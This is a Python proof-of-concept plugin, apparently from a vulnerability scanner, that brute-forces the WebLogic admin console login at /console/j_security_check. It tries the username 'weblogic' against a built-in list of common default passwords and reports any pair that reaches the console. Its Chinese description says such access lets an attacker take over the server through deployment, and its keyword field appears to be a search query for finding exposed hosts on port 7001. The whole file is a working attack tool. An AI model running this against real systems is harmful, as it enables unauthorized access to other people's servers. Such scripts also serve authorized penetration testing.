#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

def get_plugin_info():
    plugin_info = {
        "name": "Weblogic 弱口令",
        "desc": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:weblogic port:7001",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    user_list = ['weblogic']
    passwd_list = ['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
    error_i=0
    flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
    for user in user_list:
        for passwd in passwd_list:
            try:
                r = requests.post(
                    url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/console/j_security_check',
                    headers=headers,
                    data=f'j_username={user}&j_password={passwd}&j_character_encoding=UTF-8',
                    timeout=timeout,
                    verify=False
                    )
            except requests.exceptions.ConnectionError:
                return
            except requests.HTTPError:
                return
            except:
                error_i+=1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in r.text:
                    return f'{arg}\t{user}/{passwd}'

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
